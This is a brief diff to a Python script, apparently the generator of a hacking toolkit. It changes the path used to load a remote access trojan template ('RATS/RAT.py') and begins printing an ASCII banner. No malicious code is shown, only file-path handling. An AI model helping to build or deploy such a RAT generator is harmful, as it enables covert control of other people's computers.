@@ -13,9 +13,9 @@ def rgb(r, g, b):
 def main(mode):
     clear()
     if 'windows' in OStype():
-        code =open(f'{getcwd()}\\tools\\RATS\\RAT.py','r')
+        code =open(f'{__file__.replace("generator.py","")}RATS\\RAT.py','r')
     else :
-        code =open(f'{getcwd()}/tools/RATS/RAT.py','r')
+        code =open(f'{__file__.replace("generator.py","")}RATS/RAT.py','r')
     mainCode=code.read()
     selection=input(f"""
 {rgb(255, 51, 51)}  ▄████ ▓█████  ███▄    █ ▓█████  ██▀███   ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  
